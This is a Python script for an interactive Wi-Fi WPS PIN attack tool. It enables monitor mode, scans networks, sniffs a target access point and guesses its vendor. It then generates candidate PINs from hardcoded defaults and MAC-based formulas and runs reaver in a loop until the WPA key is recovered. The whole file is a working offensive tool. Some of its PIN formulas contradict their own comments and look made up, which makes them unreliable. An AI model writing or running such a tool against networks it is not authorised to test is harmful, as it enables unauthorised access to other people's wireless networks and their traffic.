import os
import time
import subprocess
from scapy.all import sniff, Dot11
from rich import print
from rich.prompt import Prompt, IntPrompt

def load_vulnerable_devices(filepath="vulnwsc.txt"):
    vulnerable = set()
    try:
        with open(filepath, "r") as f:
            for line in f:
                entry = line.strip().lower()
                if entry:
                    vulnerable.add(entry)
    except FileNotFoundError:
        print("[red]vulnwsc.txt not found. Skipping vulnerability check.[/red]")
    return vulnerable


def is_ap_vulnerable(ssid, vuln_db):
    return ssid.lower() in vuln_db

# Sample vendor PIN database
VENDOR_PINS = {
    "Arcadyan": ["12345670", "00000000"],
    "D-Link": ["12345678", "11112222"],
    "Zyxel": ["87654321", "22223333"]
}

def wps_checksum(pin7):
    accum = 0
    for i, digit in enumerate(str(pin7)):
        digit = int(digit)
        if i % 2 == 0:
            accum += digit * 3
        else:
            accum += digit
    return (10 - (accum % 10)) % 10

def generate_vendor_pins(mac, vendor):
    mac = mac.replace(":", "").upper()
    pins = []

    if vendor == "Arcadyan":
        # Reverse last 6 digits, XOR with 0x55, then checksum
        base = mac[-6:]
        reversed_mac = base[::-1]
        xor_val = int(reversed_mac, 16) ^ 0x55AAAA
        pin7 = str(xor_val)[0:7].zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    elif vendor == "D-Link":
        # Use last 7 digits of MAC
        pin7 = str(int(mac[-7:], 16))[:7].zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    elif vendor == "Huawei":
        # XOR last 6 digits with 0xAAAAAA
        xor_val = int(mac[-6:], 16) ^ 0xAAAAAA
        pin7 = str(xor_val)[0:7].zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    elif vendor == "Belkin":
        # Use last 7 digits directly
        pin7 = str(int(mac[-7:], 16)).zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    elif vendor == "Zyxel":
        # Simple MAC-based pattern
        pin7 = str(int(mac[-6:], 16))[:7].zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    elif vendor == "Trendnet":
        # Use last 6 digits + static prefix
        pin7 = "123" + str(int(mac[-6:], 16))[:4]
        pin7 = pin7[:7].zfill(7)
        pins.append(pin7 + str(wps_checksum(pin7)))

    else:
        print(f"[red]No known algorithm for vendor: {vendor}[/red]")

    return pins

def list_adapters():
    print("[bold cyan]Available WiFi Adapters:[/bold cyan]")
    subprocess.run(["bash", "-c", "iw dev | grep Interface"])

def toggle_monitor_mode(adapter, enable=True):
    mode = "start" if enable else "stop"
    print(f"[yellow]Turning {'on' if enable else 'off'} monitor mode for {adapter}...[/yellow]")
    subprocess.run(["airmon-ng", mode, adapter])

def scan_networks(adapter):
    print("[bold green]Scanning for networks... Press Ctrl+C to stop.[/bold green]")
    subprocess.run(["airodump-ng", adapter])

def capture_probe(bssid, iface="wlan0mon", vuln_db=None):
    ap_info = {}

    found = False

    def handler(pkt):
        nonlocal found
        if pkt.haslayer(Dot11) and pkt.addr2 == bssid:
            ap_info['bssid'] = pkt.addr2
            ap_info['ssid'] = pkt.info.decode(errors='ignore')
            ap_info['vendor'] = detect_vendor(pkt.addr2)
            print(f"[bold magenta]Captured AP:[/bold magenta] {ap_info}")
            found = True
            return True

    def stop_filter(pkt):
        if pkt.haslayer(Dot11) and pkt.addr2 == bssid:
            return True
        return False

    sniff(iface=iface, prn=handler, stop_filter=stop_filter, timeout=30)
    
    # Add vulnerability check if vuln_db provided
    if vuln_db:
        ssid = ap_info.get('ssid', '')
        if is_ap_vulnerable(ssid, vuln_db):
            ap_info['vulnerable'] = True
        else:
            ap_info['vulnerable'] = False
    
    return ap_info

def detect_vendor(mac):
    oui = mac.upper()[0:8]
    vendor_map = {
        "00:1C:A2": "Arcadyan",
        "00:1D:7E": "D-Link",
        "00:1F:A4": "Zyxel"
    }
    return vendor_map.get(oui, "Unknown")

def generate_pins(vendor):
    pins = VENDOR_PINS.get(vendor, [])
    print(f"[blue]Known default pins for {vendor}:[/blue] {pins}")
    # Add algorithmic generation here if needed
    return pins

def execute_attack(bssid, pins, timeout, iface="wlan0mon"):
    for pin in pins:
        print(f"[bold yellow]Trying PIN: {pin}[/bold yellow]")
        result = subprocess.run(
            ["reaver", "-i", iface, "-b", bssid, "-p", pin, "-vv"],
            capture_output=True, text=True
        )
        if "WPA PSK" in result.stdout:
            print("[bold green]Success![/bold green]")
            print(result.stdout)
            break
        else:
            print("[red]Failed. Waiting before next attempt...[/red]")
            time.sleep(timeout)

def main_menu():
    while True:
        print("\n[bold underline]Main Menu[/bold underline]")
        print("1. Select WiFi Adapter")
        print("2. Enable Monitor Mode")
        print("3. Disable Monitor Mode")
        print("4. Scan for Networks")
        print("5. Targeted WPS Attack")
        print("6. Exit")

        choice = Prompt.ask("Choose an option", choices=["1", "2", "3", "4", "5", "6"])

        if choice == "1":
            list_adapters()
        elif choice == "2":
            adapter = Prompt.ask("Enter adapter name")
            toggle_monitor_mode(adapter, enable=True)
        elif choice == "3":
            adapter = Prompt.ask("Enter adapter name")
            toggle_monitor_mode(adapter, enable=False)
        elif choice == "4":
            adapter = Prompt.ask("Enter monitor-mode adapter name")
            scan_networks(adapter)
        elif choice == "5":
            bssid = Prompt.ask("Enter target BSSID (MAC address)")
            iface = Prompt.ask("Enter monitor interface name", default="wlan0mon")
            vuln_db = load_vulnerable_devices()
            ap_info = capture_probe(bssid, iface, vuln_db)
            if not ap_info:
                print("[red]No AP data captured within 30s. Try again or check interface.[/red]")
                continue
            vendor = ap_info.get("vendor", "Unknown")
            pins = generate_vendor_pins(ap_info.get("bssid", ""), vendor)

            if ap_info.get("vulnerable"):
                print(f"[bold red]Warning: Target AP '{ap_info['ssid']}' is known to be vulnerable![/bold red]")

            print(f"[blue]Generated pins for {vendor}:[/blue] {pins}")
            timeout = IntPrompt.ask("Enter timeout between attempts (seconds)", default=15)
            execute_attack(bssid, pins, timeout, iface)
        elif choice == "6":
            print("[bold red]Exiting...[/bold red]")
            break

if __name__ == "__main__":
    main_menu()